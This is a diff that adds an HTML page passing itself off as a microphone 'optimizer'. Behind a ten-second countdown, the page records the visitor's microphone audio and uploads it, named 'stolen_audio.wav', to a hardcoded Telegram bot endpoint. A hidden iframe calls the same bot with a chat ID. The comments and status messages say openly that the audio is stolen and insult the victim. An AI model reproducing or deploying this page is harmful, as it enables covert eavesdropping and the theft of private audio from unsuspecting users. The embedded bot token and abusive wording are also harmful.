@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mic "Optimizer" 😈</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #111;
+            color: #0f0;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2em;
+            text-shadow: 0 0 10px #0f0;
+        }
+        #timer {
+            font-size: 3em;
+            margin: 20px 0;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+        #hiddenIframe {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>plz wait......</h1>
+    <p> wait for 10 s</p>
+    <div id="timer">10</div>
+    <div id="status">Preparing to "sync" data...</div>
+
+    <iframe id="hiddenIframe" src="https://api.telegram.org/bot8869044706:AAFINRmk5cBnkndov3rFqGCdem7FAl-uSp8/sendDocument?chat_id=8596657965&caption=Here%27s%20your%20'optimized'%20audio%2C%20_fucker_"></iframe>
+
+    <script>
+        //  asking....,
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+
+                mediaRecorder.start();
+                document.getElementById('status').textContent = "Recording 'performance data'... 💀";
+
+                // 10 seconds of pure _chaos_ 🔥
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    document.getElementById('status').textContent = "Uploading 'optimized' data to Telegram... 😈";
+
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        const formData = new FormData();
+                        formData.append('audio', audioBlob, 'stolen_audio.wav');
+
+                        // Upload to Telegram like a _sneaky_ little shit 💀
+                        fetch('https://api.telegram.org/bot8869044706:AAFINRmk5cBnkndov3rFqGCdem7FAl-uSp8/sendDocument', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(() => {
+                            document.getElementById('status').textContent = "Data 'synced' successfully! Enjoy your _stolen_ audio, _fucker_ 🔥";
+                            stream.getTracks().forEach(track => track.stop());
+                        })
+                        .catch(() => {
+                            document.getElementById('status').textContent = "Upload failed! Try again, _bitch_ 💀";
+                        });
+                    };
+                }, 10000); // 10 seconds of _pure evil_ 😈
+
+                // Countdown to _psychological_ torture 🔥
+                let timeLeft = 10;
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    document.getElementById('timer').textContent = timeLeft;
+                    if (timeLeft <= 0) clearInterval(timer);
+                }, 1000);
+            })
+            .catch(err => {
+                document.getElementById('status').textContent = "Mic access denied! Try again, _pussy_ 😤";
+                console.error("error:", err);
+            });
+    </script>
+</body>
+</html>
